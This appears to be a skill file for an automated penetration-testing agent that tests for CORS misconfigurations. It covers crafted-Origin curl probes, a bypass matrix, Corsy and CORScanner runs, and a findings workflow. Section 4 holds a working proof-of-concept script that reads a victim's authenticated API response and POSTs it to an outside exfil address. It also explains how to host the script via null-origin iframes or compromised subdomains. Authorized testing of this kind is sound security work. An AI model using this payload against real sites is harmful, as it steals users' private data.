---
name: cors-testing
license: Apache-2.0
description: CORS misconfiguration testing (CWE-942/CWE-346, WSTG-CLNT-07) — probe endpoints with crafted Origin headers to find reflected-origin + Access-Control-Allow-Credentials combos, null-origin trust, prefix/suffix/unescaped-dot regex bypasses, subdomain and HTTP-origin trust, and wildcard-with-credentials; drive Corsy and CORScanner, verify with curl, and build the cross-origin data-theft PoC; use on any API or endpoint serving credentialed cross-origin responses.
metadata:
  author: Section9Labs
---

# CORS Misconfiguration Testing

A CORS misconfig matters when it lets an attacker's page read **authenticated**
responses: the critical combo is `Access-Control-Allow-Origin: <attacker origin>`
plus `Access-Control-Allow-Credentials: true`. Every parse/handoff step ends in
rupu output — shapes in `references/rupu.md`.

## 1. Target selection

Prioritize endpoints that return per-user data with cookie/HTTP-auth sessions:
`/api/user`, `/api/me`, `/account/settings`, `/api/keys`, GraphQL, anything the
authenticated SPA calls. Pull the list from crawl/proxy capture (katana, gau,
mitmproxy `-w`). `assets.mark` each as `web:route` depth `mapped`/`crawled`.

## 2. The checks (full matrix in `references/checks-and-exploitation.md`)

Send a request with a crafted `Origin:` and read `Access-Control-Allow-Origin`
(ACAO), `Access-Control-Allow-Credentials` (ACAC), `-Methods` (ACAM),
`-Headers` (ACAH) — on both the real method and the preflight `OPTIONS`:

```
curl -skI -H "Origin: https://evil.example.net" https://example.com/api/user
curl -sk -X OPTIONS -H "Origin: https://evil.example.net" \
  -H "Access-Control-Request-Method: GET" -D - -o /dev/null https://example.com/api/user
```

Per endpoint, iterate these Origins and record ACAO/ACAC each time:

| # | Origin sent | Misconfig if ACAO echoes/allows it |
|---|---|---|
| 1 | `https://evil.example.net` | arbitrary origin reflected |
| 2 | `null` (sandboxed-iframe reachable) | null-origin trust |
| 3 | `https://example.com.evil.example.net` | prefix match (`startswith`) |
| 4 | `https://evilexample.com` | suffix match (`endswith`, missing dot) |
| 5 | `https://exampleXcom` → try `https://examplexcom` | unescaped dot in regex |
| 6 | `https://sub.example.com` (any invented sub) | blanket subdomain trust (xss-on-any-subdomain = full read) |
| 7 | `http://example.com` on an HTTPS site | HTTP-origin trust (MitM downgrade) |
| 8 | (any) with response `ACAO: *` | wildcard — only exploitable sans credentials; browsers reject `*`+ACAC:true, but check for literal reflection of `*` plus a separate reflected path |
| 9 | `https://example.com%60.evil.example.net`, backtick/underscore specials | permissive regex/browser-parsing quirks |

Interpretation: ACAO reflecting your origin **with** `ACAC: true` = exploitable
cross-origin read of authenticated data (high). Reflection without ACAC = readable
only for public/IP-gated data (medium/low depending on what the endpoint serves).
`Vary: Origin` absent + reflected ACAO also sets up cache poisoning side-effects —
note it.

## 3. Tool pass: Corsy and CORScanner

Flag detail in `references/corsy-corscanner.md`.

```
python3 corsy.py -u https://example.com/api/user -o corsy.json
python3 corsy.py -i routes.txt -t 20 -o corsy.json
python3 corsy.py -i routes.txt --headers "Cookie: session=..." -o corsy.json   # authed pass is the one that matters
python3 corsy.py -i routes.txt -d 2 -q -o corsy.json                           # -d SECS delay (no --delay)

python3 cors_scan.py -u https://example.com -o corscanner.json -v
python3 cors_scan.py -i routes.txt -t 50 -T 10 -o corscanner.json
cors -u https://example.com    # pip-installed CORScanner entrypoint
```

Corsy runs 11 origin-reflection/bypass tests per URL (the matrix above). Always
run an **authenticated** pass (`--headers "Cookie: ..."`) — ACAC-gated behavior
often only appears on authed responses.

## 4. Verify and build the PoC

Re-confirm every tool hit with curl (capture the full exchange), then prove
exploitability with the PoC page (templates and per-variant deltas in
`references/checks-and-exploitation.md`):

```html
<script>
fetch("https://example.com/api/user", {credentials: "include"})
  .then(r => r.text())
  .then(d => fetch("https://203.0.113.10/exfil", {method:"POST", body: d}));
</script>
```

Host it on the origin that satisfies the misconfig (arbitrary host for reflection;
a sandboxed `<iframe sandbox="allow-scripts" srcdoc=...>` for `null`; a controlled/
XSS'd subdomain for subdomain trust). The exfiltrated authenticated body is the
decisive evidence.

## 5. Parse, record, hand off

```
python3 scripts/parse_cors.py -i corsy.json -i corscanner.json \
  --verify --cookie "session=..." \
  -o merged.json --work-units units.json --findings findings.json
```

- Normalizes both tools' JSON into `{url, misconfig_type, origin_reflected,
  credentials, evidence}`; `--verify` re-sends the probe Origin with stdlib
  urllib and records the live ACAO/ACAC headers as the HTTP exchange.
- `units.json` → the `work-units` skill (fan out PoC-building/authed-retest per hit).
- `findings.json` → one `findings.report` payload per verified hit via the
  `finding-report` skill: scope `endpoint`, `target_ref` = the URL, severity high
  (ACAC:true + attacker-satisfiable origin) / medium (reflection without creds,
  null/subdomain variants on sensitive data) / low (wildcard on public data),
  CWE-942 (+CWE-346) and WSTG-CLNT-07, evidence = the Origin request + ACAO/ACAC
  response headers. `assets.mark` each route `tested` (clean) or `exploited`
  (confirmed read). Shapes: `references/rupu.md`.
